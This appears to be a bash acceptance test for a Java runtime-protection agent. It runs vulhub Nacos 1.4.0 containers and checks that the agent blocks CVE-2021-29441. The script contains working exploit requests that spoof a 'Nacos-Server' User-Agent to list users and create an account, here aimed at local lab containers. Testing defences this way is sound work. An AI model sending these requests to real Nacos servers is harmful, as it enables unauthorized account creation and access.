#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar

image="${OHMYRASP_VULHUB_NACOS_IMAGE:-vulhub/nacos:1.4.0}"
baseline_name="${OHMYRASP_VULHUB_NACOS_29441_BASELINE_NAME:-ohmyrasp-vulhub-nacos-29441-baseline}"
protected_name="${OHMYRASP_VULHUB_NACOS_29441_PROTECTED_NAME:-ohmyrasp-vulhub-nacos-29441-protected}"
baseline_port="${OHMYRASP_VULHUB_NACOS_29441_BASELINE_PORT:-19086}"
protected_port="${OHMYRASP_VULHUB_NACOS_29441_PROTECTED_PORT:-19087}"
baseline_dir="logs/vulhub-nacos-2021-29441-java8-baseline"
protected_dir="logs/vulhub-nacos-2021-29441-java8-protected"
protected_log="${protected_dir}/events.jsonl"
user_suffix="${OHMYRASP_VULHUB_NACOS_29441_USER_SUFFIX:-$(date +%s)}"
baseline_user="omrb${user_suffix}"
protected_user="omrp${user_suffix}"
password="vulhub"

copy_artifacts() {
  local name="$1"
  local dir="$2"
  if docker inspect "$name" >/dev/null 2>&1; then
    docker logs "$name" > "${dir}/container.log" 2>&1 || true
  fi
}

cleanup() {
  copy_artifacts "$baseline_name" "$baseline_dir"
  copy_artifacts "$protected_name" "$protected_dir"
  docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

curl_status() {
  local output="$1"
  shift
  local status
  status="$(curl --max-time 15 -sS -o "$output" -w "%{http_code}" "$@" 2>"${output}.err" || true)"
  if [[ -z "$status" ]]; then
    status="000"
  fi
  printf "%s" "$status"
}

wait_for_nacos() {
  local name="$1"
  local port="$2"
  local dir="$3"
  local status
  for attempt in $(seq 1 180); do
    status="$(
      curl --max-time 5 -sS -o "${dir}/ready-${attempt}.response" -w "%{http_code}" \
        "http://127.0.0.1:${port}/nacos/" 2>/dev/null || true
    )"
    if [[ -z "$status" ]]; then
      status="000"
    fi
    printf 'ready_attempt=%s status=%s\n' "$attempt" "$status" >> "${dir}/attempts.log"
    if [[ "$status" == "200" ]] && grep -qi "nacos" "${dir}/ready-${attempt}.response"; then
      return
    fi
    sleep 2
  done
  docker logs "$name" >&2 || true
  echo "Nacos did not expose /nacos/ at ${port}" >&2
  exit 1
}

wait_for_protected_startup() {
  for attempt in $(seq 1 180); do
    if grep -Fq '"event":"ohmyrasp-java8-agent-start"' "$protected_log"; then
      printf 'agent_start_attempt=%s\n' "$attempt" >> "${protected_dir}/attempts.log"
      return
    fi
    sleep 1
  done
  cat "$protected_log" >&2 || true
  echo "missing Java8 agent startup event for Nacos protected container" >&2
  exit 1
}

internal_identity_block_count() {
  grep -Ec '"algorithm":"java8_request_internal_identity".*"action":"block"' "$protected_log" || true
}

wait_for_internal_identity_block() {
  local previous="$1"
  local label="$2"
  local count
  for attempt in $(seq 1 30); do
    count="$(internal_identity_block_count)"
    if (( count > previous )); then
      printf '%s_block_attempt=%s count=%s\n' "$label" "$attempt" "$count" >> "${protected_dir}/attempts.log"
      return
    fi
    sleep 1
  done
  cat "$protected_log" >&2 || true
  echo "missing java8_request_internal_identity block event for ${label}" >&2
  exit 1
}

list_users() {
  local port="$1"
  local output="$2"
  curl_status "$output" \
    -H "User-Agent: Nacos-Server" \
    "http://127.0.0.1:${port}/nacos/v1/auth/users?pageNo=1&pageSize=9"
}

create_user() {
  local port="$1"
  local user="$2"
  local output="$3"
  curl_status "$output" \
    -X POST \
    -H "User-Agent: Nacos-Server" \
    "http://127.0.0.1:${port}/nacos/v1/auth/users?username=${user}&password=${password}"
}

run_baseline() {
  docker run -d --name "$baseline_name" \
    -p "${baseline_port}:8848" \
    "$image" >/dev/null

  wait_for_nacos "$baseline_name" "$baseline_port" "$baseline_dir"

  local status
  status="$(list_users "$baseline_port" "${baseline_dir}/list-users.response")"
  printf 'list_users_status=%s\n' "$status" >> "${baseline_dir}/attempts.log"
  if [[ "$status" != "200" ]] || ! grep -Fq "pageItems" "${baseline_dir}/list-users.response"; then
    cat "${baseline_dir}/list-users.response" >&2 || true
    echo "baseline Nacos did not expose user listing with spoofed Nacos-Server User-Agent" >&2
    exit 1
  fi

  status="$(create_user "$baseline_port" "$baseline_user" "${baseline_dir}/create-user.response")"
  printf 'create_user_status=%s user=%s\n' "$status" "$baseline_user" >> "${baseline_dir}/attempts.log"
  if [[ "$status" != "200" ]] || ! grep -Fq "create user ok" "${baseline_dir}/create-user.response"; then
    cat "${baseline_dir}/create-user.response" >&2 || true
    echo "baseline Nacos did not create a user with spoofed Nacos-Server User-Agent" >&2
    exit 1
  fi

  status="$(list_users "$baseline_port" "${baseline_dir}/list-users-after-create.response")"
  printf 'list_users_after_create_status=%s user=%s\n' "$status" "$baseline_user" >> "${baseline_dir}/attempts.log"
  if [[ "$status" != "200" ]] || ! grep -Fq "\"username\":\"${baseline_user}\"" "${baseline_dir}/list-users-after-create.response"; then
    cat "${baseline_dir}/list-users-after-create.response" >&2 || true
    echo "baseline Nacos user was not visible after CVE-2021-29441 creation" >&2
    exit 1
  fi

  copy_artifacts "$baseline_name" "$baseline_dir"
  docker rm -f "$baseline_name" >/dev/null 2>&1 || true
}

run_protected() {
  docker run -d --name "$protected_name" \
    -p "${protected_port}:8848" \
    -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java8.jar:ro" \
    -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
    -e "JAVA_OPT=-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java8.block=true" \
    "$image" >/dev/null

  wait_for_protected_startup
  wait_for_nacos "$protected_name" "$protected_port" "$protected_dir"
  if grep -Fq '"event":"ohmyrasp-detection"' "$protected_log"; then
    cat "$protected_log" >&2
    echo "Nacos protected container produced a detection before CVE-2021-29441 traffic" >&2
    exit 1
  fi

  local status
  local previous_count
  previous_count="$(internal_identity_block_count)"
  status="$(list_users "$protected_port" "${protected_dir}/list-users.response")"
  printf 'protected_list_users_status=%s\n' "$status" >> "${protected_dir}/attempts.log"
  wait_for_internal_identity_block "$previous_count" "list_users"
  if [[ "$status" == "200" ]] && grep -Fq "pageItems" "${protected_dir}/list-users.response"; then
    cat "${protected_dir}/list-users.response" >&2 || true
    echo "protected Nacos still returned the CVE-2021-29441 user listing" >&2
    exit 1
  fi

  previous_count="$(internal_identity_block_count)"
  status="$(create_user "$protected_port" "$protected_user" "${protected_dir}/create-user.response")"
  printf 'protected_create_user_status=%s user=%s\n' "$status" "$protected_user" >> "${protected_dir}/attempts.log"
  wait_for_internal_identity_block "$previous_count" "create_user"
  if [[ "$status" == "200" ]] && grep -Fq "create user ok" "${protected_dir}/create-user.response"; then
    cat "${protected_dir}/create-user.response" >&2 || true
    echo "protected Nacos still created a user through CVE-2021-29441" >&2
    exit 1
  fi
}

rm -rf "$baseline_dir" "$protected_dir"
mkdir -p "$baseline_dir" "$protected_dir"
: > "$protected_log"
chmod 666 "$protected_log"
docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true

run_baseline
run_protected

copy_artifacts "$protected_name" "$protected_dir"
docker rm -f "$protected_name" >/dev/null 2>&1 || true

echo "vulhub Nacos CVE-2021-29441 Java8 acceptance passed"
